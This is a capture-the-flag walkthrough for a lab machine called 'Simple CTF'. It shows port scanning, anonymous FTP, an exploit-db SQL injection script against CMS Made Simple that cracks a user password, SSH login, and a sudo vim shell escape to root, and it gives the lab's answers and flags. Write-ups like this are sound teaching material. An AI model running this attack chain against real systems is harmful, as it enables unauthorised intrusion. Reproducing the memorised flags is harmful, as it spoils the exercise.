# Simple CTF

## Useful tools and resources
- Nmap
- gobuster
- rockyou.txt
- [dirsearch](https://github.com/maurosoria/dirsearch)
- [100k Most used passwords](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt)

## Task 1: Simple CTF
### 1. How many services are running under port 1000?
```
2
```
First, we do an nmap scan to the machine, checking for all ports.\
__nmap output__:
```
> nmap -sT -p- 10.10.253.82
Nmap scan report for 10.10.253.82
Host is up (0.20s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```
We find ports 21 and 80, which are under 1000.

### 2. What is running in the higher port?
```
ssh
```
We now do an nmap scan to the highestt port, which is 2222.\
__nmap output__:
```
> nmap -sV -p 2222 10.10.253.82
Nmap scan report for 10.10.253.82
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We see that this port has __ssh__ as its service.

Another alternative for the nmap scan could be:
```bash
nmap -A -T4 -p- 10.10.x.x
```

### 3. What's the CVE you're using against the application?
```
CVE-2019-9053
```

### 4. To what kind of vulnerability is the application vulnerable?
```
SQLi
```

First, we are going to acces the ftp service through the user 'anonymous'. Inside the ftp we find a text file with important information. We get the file and transfer it to our computer so we can read it.
```bash
kali@kali:~$ ftp 10.10.253.82
Connected to 10.10.253.82.
220 (vsFTPd 3.0.3)
Name (10.10.253.82:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
226 Transfer complete.
166 bytes received in 0.00 secs (2.6832 MB/s)
ftp> exit
kali@kali:~$ cat ForMitch.txt
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

We exit out of ftp and proceed to the main page in port 80 (http) which is Apache.\
Url: `10.10.219.145/index.html`

We are going to run a __gobuster__ scan to find useful directories.\
__gobuster output__
```bash
kali@kali:~$ gobuster dir -u 10.10.219.145 -w /usr/share/wordlists/dirb/common.txt -t 15 -x php,html,txt -q
/.htaccess            (Status: 403) [Size: 297]
/.hta                 (Status: 403) [Size: 292]
/.htpasswd.html       (Status: 403) [Size: 302]
/.hta.php             (Status: 403) [Size: 296]
/.htaccess.php        (Status: 403) [Size: 301]
/.htpasswd.txt        (Status: 403) [Size: 301]
/.hta.html            (Status: 403) [Size: 297]
/.htaccess.html       (Status: 403) [Size: 302]
/.htpasswd            (Status: 403) [Size: 297]
/.htaccess.txt        (Status: 403) [Size: 301]
/.hta.txt             (Status: 403) [Size: 296]
/.htpasswd.php        (Status: 403) [Size: 301]
/index.html           (Status: 200) [Size: 11321]
/index.html           (Status: 200) [Size: 11321]
/robots.txt           (Status: 200) [Size: 929]  
/robots.txt           (Status: 200) [Size: 929]  
/server-status        (Status: 403) [Size: 301]  
/simple               (Status: 301) [Size: 315] [--> http://10.10.219.145/simple/]
```
When we inspect the __/simple__ directory, we find __CMS Made Simple__. The version can be found in the footer of the page.
If we search for this CVE: `CMS Made Simple 2.2.8 cve` we find a vulnerability to SQL Injection.

5. What's the password?
```
secret
```

6. Where can you login with the details obtained?
```
ssh
```

We then find the [Exploit Database](https://www.exploit-db.com/exploits/46635) entry with some python code.

__python command:__
```bash
python 46635.py -u http://10.10.116.229/simple --crack -w 100kcommon.txt
```
__output:__
```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```
We can use this credentials to login using ssh.
```bash
ssh mitch@10.10.116.229 -p 2222
```
When promped for the password, write: `secret`.

We are now logged in as mitch.

### 7. What's the user flag?
```
G00d j0b, keep up!
```
If we do `ls` once we are logged in, we can find a file called __user.txt__. If we cat it out we find the user flag.

### 8. Is there any other user in the home directory? What's its name?
```
sunbath
```
In our current folder, jump back a directory with `cd ..`. Now do an `ls` to see the contents of the home folder. 
We should see another user called __sunbath__.

### 9. What can you leverage to spawn a privileged shell?
```
vim
```
To see what our sudo privileges are, we can run `sudo -l`. After running it we can see that we have acces to vim, and we can exploit that to get root access.
If we search for vim in __GTFOBins__, and go to the sudo section we see a potential payload that we can use.

__payload:__
```bash
sudo vim -c ':!/bin/sh'
```
After running it, we should have root access.

### 10. What's the root flag?
```
W3ll d0n3. You made it!
```
If we change into the root folder with `cd /root` we can then run `ls -la` to see all the contents of the folder, where the root flag can be found.